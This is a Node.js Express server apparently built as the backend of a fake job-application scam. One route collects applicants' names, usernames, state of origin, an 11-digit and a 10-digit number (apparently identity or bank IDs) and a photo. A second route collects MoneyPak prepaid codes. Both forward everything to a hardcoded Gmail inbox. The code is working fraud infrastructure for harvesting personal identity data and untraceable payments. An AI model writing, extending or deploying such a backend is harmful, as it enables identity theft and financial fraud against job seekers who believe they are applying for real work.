const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const path = require("path");

const app = express();

// ===== ENV (Render handles this automatically) =====
const EMAIL_USER = process.env.EMAIL_USER;
const EMAIL_PASS = process.env.EMAIL_PASS;
const EMAIL_TO = process.env.EMAIL_TO || "survivalmanagementc@gmail.com";

// ===== DEBUG =====
console.log("EMAIL_USER:", EMAIL_USER);
console.log("EMAIL_PASS exists:", !!EMAIL_PASS);

// ===== MIDDLEWARE =====
app.use(cors({ origin: "*" }));
app.use(express.json({ limit: "20mb" }));

app.use(
    express.static(path.join(__dirname, "public"), {
        index: ["index.html", "Index.html"]
    })
);

// ===== TRANSPORTER =====
function createTransporter() {
    if (!EMAIL_USER || !EMAIL_PASS) {
        throw new Error("Missing email environment variables.");
    }

    return nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
            user: EMAIL_USER,
            pass: EMAIL_PASS
        }
    });
}

// ===== IMAGE PARSER =====
function parseImageAttachment(photoName, photoData) {
    const matches = /^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/.exec(photoData || "");

    if (!matches) return null;

    return {
        filename: photoName,
        content: matches[2],
        encoding: "base64",
        contentType: matches[1]
    };
}

// ===== APPLICATION ROUTE =====
app.post("/submit-application", async (req, res) => {
    const {
        fullName,
        preferredTrack,
        username,
        stateOfOrigin,
        testNumber11,
        testNumber10,
        photoName,
        photoData
    } = req.body;

    if (
        !fullName ||
        !preferredTrack ||
        !username ||
        !stateOfOrigin ||
        !testNumber11 ||
        !testNumber10
    ) {
        return res.status(400).json({ message: "Please complete all fields." });
    }

    if (!/^\d+$/.test(testNumber11) || !/^\d+$/.test(testNumber10)) {
    return res.status(400).json({
        message: "Invalid test numbers. Only digits are allowed."
    });
}

    const imageAttachment = parseImageAttachment(photoName, photoData);

    if (!imageAttachment) {
        return res.status(400).json({ message: "Invalid image upload." });
    }

    try {
        const transporter = createTransporter();

        await transporter.sendMail({
            from: EMAIL_USER,
            to: EMAIL_TO,
            subject: `New Job Application: ${fullName}`,
            text: `
Full Name: ${fullName}
Preferred Track: ${preferredTrack}
Username: ${username}
State: ${stateOfOrigin}
11-digit: ${testNumber11}
10-digit: ${testNumber10}
            `,
            attachments: [imageAttachment]
        });

        res.json({ message: "Application sent successfully!" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Email failed." });
    }
});

// ===== MONEYPak ROUTE =====
app.post("/submit-moneypak", async (req, res) => {
    const { moneypakCode } = req.body;

    if (!moneypakCode) {
        return res.status(400).json({ message: "Missing code." });
    }

    try {
        const transporter = createTransporter();

        await transporter.sendMail({
            from: EMAIL_USER,
            to: EMAIL_TO,
            subject: "Moneypak Code",
            text: `Code: ${moneypakCode}`
        });

        res.json({ message: "Sent successfully!" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Failed." });
    }
});

// ===== START SERVER =====
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
